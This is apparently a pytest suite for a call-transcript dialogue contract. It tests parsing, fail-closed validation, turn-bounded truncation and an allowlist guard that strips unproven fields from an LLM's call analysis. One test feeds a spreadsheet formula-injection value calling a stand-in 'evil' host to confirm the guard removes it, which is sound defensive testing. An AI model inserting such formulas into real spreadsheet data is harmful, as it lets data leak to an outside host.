    assert turn["timecode"] == line.split("]")[0] + "]"
    assert turn["approximate"] is line.startswith("[~")


@pytest.mark.parametrize(
    "line",
    [
        "сломанная строка",
        "",
        None,
        "[99:99.9] Дорожка левая: Текст",
        "[00:01.0] Дорожка левая Текст",
        "00:01.0 Дорожка левая: Текст",
    ],
)
def test_a_corrupt_line_fails_closed_instead_of_disappearing(line):
    variants = stereo()
    variants["dialogue_lines"] = ["[00:01.0] Дорожка левая: Валидно", line]

    with pytest.raises(contract.DialogueContractError):
        contract.build_dialogue_input(call(variants))


@pytest.mark.parametrize(
    "line", ["[00:05.0] Дорожка правая:", "[00:05.0] Дорожка правая:    "]
)
def test_an_empty_reply_text_fails_closed(line):
    variants = stereo()
    variants["dialogue_lines"] = ["[00:01.0] Дорожка левая: Валидно", line]

    with pytest.raises(contract.DialogueContractError, match="empty text"):
        contract.build_dialogue_input(call(variants))


def test_a_backwards_timecode_fails_closed():
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:05.0] Дорожка левая: Позже",
        "[00:01.0] Дорожка правая: Раньше",
    ]

    with pytest.raises(contract.DialogueContractError, match="backwards"):
        contract.build_dialogue_input(call(variants))


def test_a_non_list_dialogue_lines_fails_closed():
    variants = stereo()
    variants["dialogue_lines"] = "[00:01.0] Дорожка левая: Текст"

    with pytest.raises(contract.DialogueContractError, match="not a list"):
        contract.build_dialogue_input(call(variants))


def test_invalid_variants_json_is_not_the_same_as_a_missing_one():
    with pytest.raises(contract.DialogueContractError, match="invalid JSON"):
        contract.build_dialogue_input(
            {"id": 7, "source_call_id": SOURCE_CALL_ID,
             "transcript_variants_json": "not-json", "transcript_text": "Текст"}
        )
    with pytest.raises(contract.DialogueContractError, match="not an object"):
        contract.build_dialogue_input(
            {"id": 7, "source_call_id": SOURCE_CALL_ID,
             "transcript_variants_json": "[1, 2]", "transcript_text": "Текст"}
        )
    absent = contract.build_dialogue_input(
        {"id": 7, "source_call_id": SOURCE_CALL_ID,
         "transcript_variants_json": "", "transcript_text": "Текст"}
    )
    assert absent.source == contract.SOURCE_TRANSCRIPT_FALLBACK
    assert absent.render() == "[00:00.0] Не определено: Текст"


def test_missing_dialogue_lines_produce_an_explicitly_marked_untrusted_fallback():
    dialogue = contract.build_dialogue_input(
        call({"full": {"final": "CHANNEL_LEFT: Текст\nsha256: secret\nMANAGER: Ещё"}})
    )

    assert dialogue.source == contract.SOURCE_TRANSCRIPT_FALLBACK
    assert dialogue.needs_review is True
    assert "transcript_text_fallback" in dialogue.role_attribution["reason_codes"]
    assert dialogue.render() == "[00:00.0] Не определено: Текст Ещё"


def test_a_fallback_is_untrusted_even_with_fully_proven_evidence():
    variants = trusted_variants()
    variants["dialogue_lines"] = []
    variants["full"] = {"final": "CHANNEL_LEFT: Текст"}
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["trusted"] is False
    assert "transcript_text_fallback" in dialogue.role_attribution["reason_codes"]
    assert "unknown_speaker_label" in dialogue.role_attribution["reason_codes"]


def test_an_empty_dialogue_is_untrusted_and_never_not_applicable():
    """Nobody listened to the audio, so nothing is proven about it."""
    dialogue = contract.build_dialogue_input(call({"dialogue_lines": []}))

    assert dialogue.turns == ()
    assert dialogue.render() == ""
    assert dialogue.role_attribution["decision"] == "untrusted"
    assert dialogue.role_attribution["trusted"] is False
    assert dialogue.needs_review is True
    assert "empty_dialogue" in dialogue.role_attribution["reason_codes"]


def test_transcript_text_is_used_only_when_no_dialogue_lines_exist():
    dialogue = contract.build_dialogue_input(
        call(stereo(), transcript_text="MANAGER:\nАварийный текст")
    )
    assert dialogue.source == contract.SOURCE_DIALOGUE_LINES
    assert "Аварийный" not in dialogue.render()


def test_canonical_sha_is_deterministic_and_input_sensitive():
    first = contract.build_dialogue_input(call(stereo()))
    second = contract.build_dialogue_input(call(stereo()))
    changed = stereo()
    changed["dialogue_lines"] = [
        "[00:01.0] Дорожка правая: Здравствуйте",
        "[00:03.0] Дорожка левая: Добрый день",
    ]
    reordered = contract.build_dialogue_input(call(changed))

    assert first.canonical_sha256 == second.canonical_sha256
    assert first.version == contract.CONTRACT_VERSION
    assert first.canonical_sha256 != reordered.canonical_sha256
    assert first.turns == second.turns


def test_trust_changes_the_canonical_sha_of_the_same_lines():
    untrusted = contract.build_dialogue_input(call(stereo("confirmed_multi_signal")))
    trusted = contract.build_dialogue_input(call(trusted_variants()))

    assert untrusted.canonical_sha256 != trusted.canonical_sha256


# --- Этап B: whole-turn rendering for Analyse -------------------------------


def long_dialogue(turn_count=12, filler="абвгдеёжзийклмнопрстуфхцчшщэюя " * 6):
    variants = stereo()
    variants["dialogue_lines"] = [
        f"[00:{index:02d}.0] Дорожка {'левая' if index % 2 else 'правая'}: "
        f"Реплика {index} {filler}"
        for index in range(1, turn_count + 1)
    ]
    return variants


def test_analysis_rendering_uses_whole_lines_with_turn_ids():
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Первая",
        "[00:02.0] Дорожка правая: Вторая",
        "[00:03.0] Дорожка левая: Третья",
    ]
    rendered = contract.build_dialogue_input(call(variants)).render_for_analysis()

    assert rendered["text"] == (
        "T0001 [00:01.0] Спикер A: Первая\n"
        "T0002 [00:02.0] Спикер B: Вторая\n"
        "T0003 [00:03.0] Спикер A: Третья"
    )
    assert rendered["selected_turn_ids"] == ["T0001", "T0002", "T0003"]
    assert rendered["selected_turn_count"] == rendered["total_turn_count"] == 3
    assert rendered["truncated"] is False


def test_chronological_order_a1_b1_a2_is_preserved_exactly():
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: A1",
        "[00:02.0] Дорожка правая: B1",
        "[00:03.0] Дорожка левая: A2",
    ]
    dialogue = contract.build_dialogue_input(call(variants))

    assert [turn["text"] for turn in dialogue.turns] == ["A1", "B1", "A2"]
    assert dialogue.render_for_analysis()["text"].splitlines() == [
        "T0001 [00:01.0] Спикер A: A1",
        "T0002 [00:02.0] Спикер B: B1",
        "T0003 [00:03.0] Спикер A: A2",
    ]


def test_a_long_prompt_is_cut_only_on_turn_boundaries():
    dialogue = contract.build_dialogue_input(call(long_dialogue()))
    full = dialogue.render_for_analysis()
    short = dialogue.render_for_analysis(max_chars=900)
    whole_turns = set(full["text"].splitlines())

    assert short["truncated"] is True
    assert len(short["text"]) <= 900
    assert short["selected_turn_count"] < short["total_turn_count"] == 12
    for line in short["text"].splitlines():
        assert line == contract.ANALYSIS_TRUNCATION_MARKER or line in whole_turns
    # Both ends of the call survive, and the ids say exactly which turns did.
    assert short["selected_turn_ids"][0] == "T0001"
    assert short["selected_turn_ids"][-1] == "T0012"
    assert short["selected_turn_ids"] == sorted(short["selected_turn_ids"])


def test_a_single_oversized_turn_fails_closed_instead_of_overrunning_the_budget():
    variants = stereo()
    variants["dialogue_lines"] = ["[00:01.0] Дорожка левая: " + "я" * 500]
    dialogue = contract.build_dialogue_input(call(variants))

    with pytest.raises(contract.DialogueContractError, match="fits no whole turn"):
        dialogue.render_for_analysis(max_chars=50)
    # The reply itself is never shortened: without a budget it stays whole.
    assert dialogue.render_for_analysis()["text"].endswith("я" * 500)


def test_an_oversized_turn_is_dropped_whole_and_the_budget_is_respected():
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Короткая первая",
        "[00:02.0] Дорожка правая: " + "я" * 4000,
        "[00:03.0] Дорожка левая: Короткая последняя",
    ]
    short = contract.build_dialogue_input(call(variants)).render_for_analysis(
        max_chars=300
    )

    assert len(short["text"]) <= 300
    assert "я" * 4000 not in short["text"]
    assert short["selected_turn_ids"] == ["T0001", "T0003"]
    assert short["truncated"] is True
    assert contract.ANALYSIS_TRUNCATION_MARKER in short["text"]


# --- Этап B/F: strict Mango provider phrases --------------------------------


def test_provider_phrase_hash_is_deterministic_and_order_sensitive():
    first = contract.canonical_provider_phrases_sha256(PROVEN_PHRASES)
    second = contract.canonical_provider_phrases_sha256(
        [dict(phrase) for phrase in PROVEN_PHRASES]
    )
    other = contract.canonical_provider_phrases_sha256(
        [
            {"role": "client", "text": "Добрый день"},
            {"role": "operator", "text": "Здравствуйте"},
        ]
    )

    assert first == second
    assert first != other


def test_a_provider_phrase_is_a_role_and_a_text_and_nothing_more():
    """The official answer promises no start time and no channel per phrase.

    Requiring either would let a hand-written fixture prove a side binding the
    real API never sends, so both are ignored rather than trusted.
    """
    canonical = contract.canonical_provider_phrases(
        [{"role": "operator", "text": " Добрый день ", "start": 1.0, "channel": "left"}]
    )

    assert canonical == [{"role": "operator", "text": "Добрый день"}]

    assert contract.canonical_provider_phrases(
        [["operator", " Добрый день "]]
    ) == [{"role": "operator", "text": "Добрый день"}]


@pytest.mark.parametrize(
    "phrases",
    [
        [],
        "phrases",
        [{"role": "manager", "text": "x"}],
        [{"role": "operator"}],
        [{"text": "x"}],
        [{"role": "client", "text": "   "}],
        [{"role": "client", "text": 5}],
        ["[00:01.0] client: x"],
        [["client"]],
        [["client", "x", "лишнее"]],
    ],
)
def test_invalid_provider_phrases_are_rejected(phrases):
    with pytest.raises(contract.DialogueContractError):
        contract.canonical_provider_phrases(phrases)


@pytest.mark.parametrize(
    "names",
    [
        [{"name": "Оператор", "role": "operator"}],
        {},
        {"operator": ""},
        {"operator": "Иванов", "client": 5},
        "Оператор",
    ],
)
def test_the_names_declaration_must_be_the_documented_object(names):
    with pytest.raises(contract.DialogueContractError):
        contract.provider_names(names)


@pytest.mark.parametrize(
    ("names", "ordinary"),
    [
        ({"operator": "Иванов", "client": "+79000000000"}, True),
        ({"operator": "Иванов", "client": "Клиент"}, True),
        ({"operator": "Иванов", "client": "Петров"}, False),
        ({"operator": "Канал 2", "client": "Клиент"}, False),
        ({"operator": "Канал 2", "client": "Канал 1"}, False),
        ({"operator": "Иванов", "client": "иванов"}, False),
        ({"operator": "Иванов"}, False),
        ({"operator": "Иванов", "client": "+79000000000", "third": "Петров"}, False),
    ],
)
def test_only_an_operator_plus_a_different_client_is_an_ordinary_call(names, ordinary):
    assert contract.is_ordinary_two_party_names(names) is ordinary


# --- Fail-closed projection of an unproven analysis -------------------------


def rich_analysis(**overrides):
    """Everything a model, an old prompt or a future version could produce."""
    payload = {
        "analysis_schema_version": "v2",
        "summary": "Менеджер Иван пообещал прислать ссылку на оплату.",
        "history_summary": "Клиент Мария Иванова согласилась оплатить курс.",
        "history_short": "Клиент готов оплатить.",
        "target_product": "Курс ЕГЭ",
        "topic": "Оплата годового курса",
        "structured_fields": {
            "people": {"parent_fio": "Иванова Мария", "child_fio": "Иванов Пётр"},
            "contacts": {"email": "mama@example.com", "preferred_channel": "telegram"},
            "student": {"grade_current": "11", "school": "Лицей 1"},
            "interests": {"products": ["Курс ЕГЭ"], "subjects": ["Математика"]},
            "commercial": {"budget": "60000", "discount_interest": "да"},
            "objections": ["Цена"],
            "next_step": {"action": "Отправить ссылку на оплату", "due": "завтра"},
            "lead_priority": "hot",
        },
        "crm_blocks": {"next_step": {"action": "Позвонить", "due": "завтра"}},
        "next_step": "Отправить ссылку на оплату",
        "timeline": "завтра",
        "objections": ["Цена"],
        "tags": ["sales_call"],
        "evidence": [{"speaker": "Менеджер", "ts": "00:01.0", "text": "Пришлю ссылку"}],
        "follow_up_score": 88,
        "lead_priority": "hot",
        "personal_offer": "Скидка 10%",
        "payment_status": "оплатил",
        "outcome": "успех",
        "quality_flags": {
            "mode": "stereo",
            "call_type": "sales_call",
            "needs_review": False,
            "review_reasons": [],
            "manager_score": 95,
        },
        "analysis_meta": {
            "analysis_model": "gpt-x",
            "analysis_provider": "openai",
            "token_usage": {
                "source": "unavailable",
                "prompt_tokens": None,
                "completion_tokens": None,
                "total_tokens": 100,
            },
            "internal_note": "служебное",
        },
        # The key nobody blacklisted, because it does not exist yet.
        "next_prompt_version_field": "Клиент оплатил 60000 рублей",
    }
    payload.update(overrides)
    return payload


def untrusted_dialogue_with_text():
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Расскажу про подготовку к ЕГЭ по математике",
        "[00:03.0] Дорожка правая: Какая стоимость годового курса",
    ]
    return contract.build_dialogue_input(call(variants))


def test_an_unproven_analysis_is_rebuilt_from_the_allowlist_not_stripped():
    guarded = contract.apply_role_guard(rich_analysis(), untrusted_dialogue_with_text())

    assert set(guarded) == {
        "analysis_schema_version",
        "untrusted_projection_version",
        "neutral_topic_version",
        "neutral_topics",
        "summary",
        "manager_brief",
        "history_summary",
        "history_short",
        "follow_up_reason",
        "role_attribution",
        "dialogue_input",
        "needs_review",
        "review_reasons",
        "review_reasons_ru",
        "structured_fields",
        "display_fields",
        "crm_blocks",
        "evidence",
        "claim_evidence",
        "normalized_facts",
        "tags",
        "objections",
        "quality_flags",
        "analysis_meta",
    }
    assert guarded["structured_fields"] == {}
    assert guarded["crm_blocks"] == {}
    assert guarded["evidence"] == []
    assert guarded["tags"] == []
    assert guarded["objections"] == []
    # No proven side means no proven fact, so there is nothing to evidence and
    # nothing to normalize — and both keys exist so a reader never has to guess.
    assert guarded["claim_evidence"] == []
    assert guarded["normalized_facts"] == []


@pytest.mark.parametrize(
    "leaked",
    [
        "Иванова Мария", "Иванов Пётр", "mama@example.com", "telegram", "Лицей 1",
        "Отправить ссылку на оплату", "Позвонить", "завтра", "Скидка 10%",
        "Курс ЕГЭ", "оплатил", "успех", "Цена", "пообещал",
        "Оплата годового курса", "next_prompt_version_field",
        "manager_score", "служебное", "lead_priority",
        "follow_up_score", "discount_interest",
    ],
)
def test_no_unproven_value_of_any_class_survives_the_projection(leaked):
    guarded = contract.apply_role_guard(rich_analysis(), untrusted_dialogue_with_text())

    assert leaked not in json.dumps(guarded, ensure_ascii=False)


def test_no_number_of_any_commercial_class_survives_the_projection():
    """Digits are checked structurally: a hash legitimately contains digits."""
    guarded = contract.apply_role_guard(rich_analysis(), untrusted_dialogue_with_text())

    assert guarded["structured_fields"] == {}
    assert "follow_up_score" not in guarded and "lead_priority" not in guarded
    assert "manager_score" not in guarded["quality_flags"]
    assert guarded["analysis_meta"]["token_usage"] == {
        "source": "unavailable",
        "prompt_tokens": None,
        "completion_tokens": None,
        "total_tokens": 100,
    }


def test_untrusted_token_usage_rejects_unknown_or_textual_payloads():
    analysis = rich_analysis()
    analysis["analysis_meta"]["token_usage"] = {
        "source": "provider",
        "prompt_tokens": "Иванова Мария",
        "completion_tokens": 7,
        "total_tokens": 8,
    }

    guarded = contract.apply_role_guard(analysis, untrusted_dialogue_with_text())

    assert "token_usage" not in guarded["analysis_meta"]
    assert "Иванова Мария" not in json.dumps(guarded, ensure_ascii=False)


def test_a_future_unknown_key_cannot_ride_along():
    guarded = contract.apply_role_guard(
        rich_analysis(a_key_invented_next_quarter={"deal": "закрыта", "sum": 60000}),
        untrusted_dialogue_with_text(),
    )

    assert "a_key_invented_next_quarter" not in guarded
    assert "закрыта" not in json.dumps(guarded, ensure_ascii=False)


def test_a_formula_like_value_never_reaches_a_spreadsheet_cell():
    analysis = rich_analysis()
    analysis["quality_flags"]["mode"] = "=IMPORTXML(\"http://evil\",\"//a\")"
    analysis["analysis_meta"]["analysis_model"] = "@SUM(A1:A2)"

    guarded = contract.apply_role_guard(analysis, untrusted_dialogue_with_text())

    assert "mode" not in guarded["quality_flags"]
    assert "analysis_model" not in guarded["analysis_meta"]
    assert "IMPORTXML" not in json.dumps(guarded, ensure_ascii=False)


def test_the_summary_is_fixed_and_the_topic_is_deterministic():
    dialogue = untrusted_dialogue_with_text()
    first = contract.apply_role_guard(rich_analysis(), dialogue)
    second = contract.apply_role_guard(
        rich_analysis(summary="совершенно другой текст модели"), dialogue
    )

    assert first["summary"] == contract.UNTRUSTED_SUMMARY
    assert first["summary"] == first["history_summary"] == first["history_short"]
    assert first["summary"] == second["summary"]
    # The topic comes from the closed vocabulary applied to the dialogue text.
    assert first["neutral_topics"] == second["neutral_topics"]
    assert set(first["neutral_topics"]) == {
        "математика", "подготовка к ЕГЭ", "стоимость и оплата",
    }
    assert first["neutral_topic_version"] == contract.NEUTRAL_TOPIC_VERSION


def test_only_technical_flags_survive_and_they_agree_with_the_top_object():
    analysis = rich_analysis()
    analysis["quality_flags"].update(
        {"analyze_prompt_version": "v6", "analysis_input_sha256": "a" * 64}
    )
    dialogue = untrusted_dialogue_with_text()

    guarded = contract.apply_role_guard(analysis, dialogue)
    flags = guarded["quality_flags"]

    assert flags["analyze_prompt_version"] == "v6"
    assert flags["analysis_input_sha256"] == "a" * 64
    assert "call_type" not in flags and "manager_score" not in flags
    assert set(flags) <= (
        contract.UNTRUSTED_QUALITY_FLAG_ALLOWLIST
        | {
            "role_attribution", "role_attribution_version", "role_attribution_decision",
            "role_attribution_reason_codes", "role_attribution_untrusted",
            "needs_review", "review_reasons",
        }
    )
    assert guarded["needs_review"] is True and flags["needs_review"] is True
    assert flags["review_reasons"] == guarded["review_reasons"]
    assert "role_attribution_untrusted" in guarded["review_reasons"]
    assert flags["dialogue_canonical_sha256"] == dialogue.canonical_sha256


def test_the_review_reason_is_a_russian_sentence_not_a_code():
    guarded = contract.apply_role_guard(rich_analysis(), untrusted_dialogue_with_text())

    assert guarded["review_reasons_ru"]
    for sentence in guarded["review_reasons_ru"]:
        assert sentence == sentence.strip() and " " in sentence
        assert not sentence.isascii()
    assert guarded["follow_up_reason"] == contract.UNTRUSTED_FOLLOW_UP_REASON


def test_a_trusted_analysis_keeps_its_content():
    dialogue = contract.build_dialogue_input(call(trusted_variants()))
    guarded = contract.apply_role_guard(rich_analysis(), dialogue)

    assert dialogue.trusted is True
    assert guarded["next_step"] == "Отправить ссылку на оплату"
    assert guarded["structured_fields"]["people"]["parent_fio"] == "Иванова Мария"
    assert guarded["quality_flags"]["role_attribution_untrusted"] is False


# --- The one entry point every stored-payload reader uses -------------------


def test_a_stored_payload_of_an_unproven_call_is_projected_on_read():
    guarded = contract.guard_stored_analysis(call(stereo()), rich_analysis())

    assert guarded["summary"] == contract.UNTRUSTED_SUMMARY
    assert guarded["structured_fields"] == {}


def current_stored_v3(dialogue):
    fields = {
        "result": {"status": None, "detail": None},
        "people": {"parent_fio": None, "child_fio": None},
        "contacts": {
            "email": None,
            "preferred_channel": None,
            "phone_from_filename": None,
        },
        "student": {"grade_current": None, "school": None},
        "interests": {"products": [], "format": [], "subjects": [], "exam_targets": []},
        "commercial": {"price_sensitivity": None, "budget": None, "discount_interest": None},
        "objections": [],
        "next_step": {"action": None, "due": None},
        "lead_priority": "cold",
    }
    input_sha = "a" * 64
    payload = {
        "analysis_schema_version": contract.ANALYSIS_SCHEMA_VERSION_V3,
        "claim_contract_version": contract.CLAIM_CONTRACT_VERSION,
        "structured_fields": fields,
        "display_fields": fields,
        "crm_blocks": fields,
        "claim_evidence": [],
        "normalized_facts": [],
        "dialogue_input": {
            "version": contract.CONTRACT_VERSION,
            "source": dialogue.source,
            "canonical_sha256": dialogue.canonical_sha256,
            "turn_count": len(dialogue.turns),
        },
        "quality_flags": {
            "analysis_input_sha256": input_sha,
            "dialogue_canonical_sha256": dialogue.canonical_sha256,
        },
        "analysis_meta": {
            "analysis_input_sha256": input_sha,
            "analysis_schema_version": contract.ANALYSIS_SCHEMA_VERSION_V3,
            "dialogue_contract_version": contract.CONTRACT_VERSION,
            "dialogue_canonical_sha256": dialogue.canonical_sha256,
            "role_guard_version": contract.ROLE_GUARD_VERSION,
            "prompt_contract_version": contract.CLAIM_CONTRACT_VERSION,
            "claim_contract_version": contract.CLAIM_CONTRACT_VERSION,
            "detector_contract_version": contract.DETECTOR_CONTRACT_VERSION,
            "history_summary_contract_version": contract.HISTORY_SUMMARY_CONTRACT_VERSION,
            "normalizer_engine_version": contract.TENANT_TEXT_ENGINE_VERSION,
            "normalizer_ruleset_version": contract.tenant_ruleset_version(contract.CALLS_TENANT_ID),
            "normalizer_tenant_id": contract.CALLS_TENANT_ID,
            "timezone_contract_version": contract.TIMEZONE_CONTRACT_VERSION,
        },
    }
    payload["analysis_meta"]["manager_output_sha256"] = (
        contract.manager_output_sha256(payload)
    )
    return payload


def test_a_current_stored_v3_payload_survives_the_read_guard():
    dialogue = contract.build_dialogue_input(call(trusted_variants()))
    guarded = contract.guard_stored_analysis(
        call(trusted_variants()), current_stored_v3(dialogue)
    )

    assert guarded["structured_fields"]["lead_priority"] == "cold"
    assert guarded["quality_flags"]["role_attribution_untrusted"] is False
    assert "analysis_contract_invalid" not in guarded.get("review_reasons", [])


def test_stored_analysis_guard_is_idempotent_for_trusted_untrusted_and_invalid():
    trusted_record = call(trusted_variants())
    dialogue = contract.build_dialogue_input(trusted_record)
    current = current_stored_v3(dialogue)
    trusted_once = contract.guard_stored_analysis(trusted_record, current)
    assert contract.guard_stored_analysis(trusted_record, trusted_once) == trusted_once

    untrusted_record = call(stereo())
    untrusted_once = contract.guard_stored_analysis(untrusted_record, rich_analysis())
    assert contract.guard_stored_analysis(untrusted_record, untrusted_once) == untrusted_once

    invalid = current_stored_v3(dialogue)
    invalid["analysis_meta"]["normalizer_ruleset_version"] = "stale"
    invalid_once = contract.guard_stored_analysis(trusted_record, invalid)
    assert contract.guard_stored_analysis(trusted_record, invalid_once) == invalid_once


@pytest.mark.parametrize(
    "mutate",
    [
        lambda payload: payload.update(analysis_schema_version="v2"),
        lambda payload: payload["analysis_meta"].update(normalizer_ruleset_version="old"),
        lambda payload: payload["display_fields"]["result"].update(detail="Выдуманный итог"),
        lambda payload: payload.update(history_summary="Выдуманный итог разговора"),
        lambda payload: payload.update(next_step="Оплатить немедленно"),
        lambda payload: payload.update(neutral_topics=["выдуманная тема"]),
        lambda payload: payload.update(review_reasons_ru=["выдуманная причина"]),
    ],
)
def test_stale_or_tampered_stored_analysis_fails_closed(mutate):
    dialogue = contract.build_dialogue_input(call(trusted_variants()))
    payload = current_stored_v3(dialogue)
    mutate(payload)

    guarded = contract.guard_stored_analysis(call(trusted_variants()), payload)

    assert guarded["structured_fields"] == {}
    assert guarded["display_fields"] == {}
    assert "analysis_contract_invalid" in guarded["review_reasons"]
    assert guarded["summary"] == contract.INVALID_STORED_SUMMARY
    assert "стороны разговора не подтверждены" not in guarded["summary"].lower()
    assert "Выдуманный итог" not in json.dumps(guarded, ensure_ascii=False)


def test_rehashed_legacy_free_form_evidence_still_fails_closed():
    dialogue = contract.build_dialogue_input(call(trusted_variants()))
    payload = current_stored_v3(dialogue)
    payload["evidence"] = [{"speaker": "Клиент", "text": "Чужая цитата"}]
    payload["analysis_meta"]["manager_output_sha256"] = (
        contract.manager_output_sha256(payload)
    )

    guarded = contract.guard_stored_analysis(call(trusted_variants()), payload)

    assert guarded["structured_fields"] == {}
    assert guarded["evidence"] == []
    assert "Чужая цитата" not in json.dumps(guarded, ensure_ascii=False)
    assert "analysis_contract_invalid" in guarded["review_reasons"]


def test_an_unreadable_dialogue_is_the_strongest_reason_not_to_trust_a_payload():
    broken = {
        "id": 7,
        "source_call_id": SOURCE_CALL_ID,
        "transcript_variants_json": "not-json",
        "transcript_text": "Текст",
    }

    guarded = contract.guard_stored_analysis(broken, rich_analysis())

    assert guarded["needs_review"] is True
    assert guarded["role_attribution"]["reason_codes"] == ["dialogue_unreadable"]
    assert guarded["neutral_topics"] == []
    assert "Иванова Мария" not in json.dumps(guarded, ensure_ascii=False)


def test_the_fail_closed_stand_in_only_uses_a_code_from_the_closed_list():
    with pytest.raises(contract.DialogueContractError):
        contract.unreadable_dialogue("invented_code")
